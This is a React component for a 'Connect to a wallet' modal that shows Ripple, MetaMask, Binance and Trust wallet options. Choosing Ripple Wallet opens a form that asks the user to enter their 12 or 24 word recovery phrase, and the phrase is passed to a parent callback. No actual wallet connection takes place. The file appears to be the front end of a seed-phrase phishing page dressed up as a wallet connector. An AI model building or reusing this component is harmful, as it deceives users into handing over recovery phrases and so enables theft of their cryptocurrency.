
import React, { useState, useEffect, useHistory } from 'react';
import Web3 from 'web3';
import { FaAlignJustify, FaHome, FaTractor, FaBabyCarriage, FaSteam, FaOutdent,
    FaShareSquare, FaTwitter, FaArrowRight, FaClosedCaptioning, FaTimes, FaQuestion, FaQuestionCircle} from 'react-icons/fa';
import MetaMask from '../../img/quotation/metamask.svg';
import Bnbwallet from '../../img/quotation/bnb-busd.svg';
import Trustwallet from '../../img/quotation/TWT.png';
import Ripplewallet from '../../img/rippleWallet.png';
import './index.css';
import Modal from 'react-modal';
import { ethers } from "ethers";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import {apiLogin} from '../../services/main';
import { TOKEN_ADDRESS, TOKEN_ABI, RPC_URL } from '../../services/Types';

const customStyles = {
    content: {
      top: '50%',
      left: '50%',
      right: 'auto',
      bottom: 'auto',
      marginRight: '-50%',
      transform: 'translate(-50%, -50%)',
      borderRadius:'25px',
      zIndex: 5000,
      color: 'white',
      width: '500px',
      backgroundColor:'#392937'
    },
    overlay: {
        background: "rgb(59 52 72 / 60%)"
    },  
};


const MyModal = ({isOpen, action, propPharse}) => {
    const [openModal, setOpenModal] = useState(false);
    const [step, setStep] = useState(1);
    const [pharse, setPharse] = useState('');

    useEffect(() =>{
        setOpenModal(isOpen)
    }, [isOpen]);
    const closeModal = () => {
        setOpenModal(false);
    }
    const ConnectWallet = () => {
        propPharse(pharse);
        action(1);
    }

    return (
        <>
            <Modal
                isOpen={openModal}
                onRequestClose={closeModal}
                style={customStyles}
                contentLabel="Example Modal"
            >
                <div className='d-flex justify-content-between title-color'>
                    <h5 className='font-OpenSansBold'>Connect to a wallet</h5>
                    <FaTimes className='cursor-pointer' onClick={closeModal}/>
                </div>
                
                <hr className='my-3'/>

                {step === 1 && (
                    <>                    
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
                            <p className='align-self-center mb-0 title-color pt-0'>Ripple Wallet</p>
                            <img src={Ripplewallet} width={35}></img>
                        </div>
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                            <p className='align-self-center mb-0 title-color pt-0'>MetaMask</p>
                            <img src={MetaMask} width={35}></img>
                        </div>
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                            <p className='align-self-center mb-0 title-color pt-0'>Binance Chain Wallet</p>
                            <img src={Bnbwallet} width={35}></img>
                        </div>
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                            <p className='align-self-center mb-0 title-color pt-0'>Trust Wallet</p>
                            <img src={Trustwallet} width={35}></img>
                        </div>
                    </>
                )}
                
                {step === 2 && (
                    <div>
                        <div className='text-center'><h5 className='font-OpenSansBold card-main-title title-color py-3'>Enter your 12 (or 24) word phrase below (words separated by a single space)</h5></div>
                        <div className='text-center'>
                            <textarea cols="40" rows="6" name="phrase" minlength="23" required="" placeholder="Write it down" className='write-component text-black' value={pharse} onChange={(e) => setPharse(e.target.value)}></textarea>
                            <div className="w-50 align-self-center btn submit-button rounded-button-long font-OpenSansBold mr-4 mt-3" onClick={() => ConnectWallet()}>
                                Submit
                            </div>
                        </div>
                    </div>
                )}           


                <div className='d-flex justify-content-center title-color'>
                    <FaQuestionCircle className='align-self-center' /><p className='align-self-center mb-0'> <a href="https://community.trustwallet.com/t/how-to-import-a-wallet-via-recovery-phrase/843" target="_blank">Learn how to connect</a> </p>
                </div>
            </Modal>
        </>
    )
}

export default MyModal;
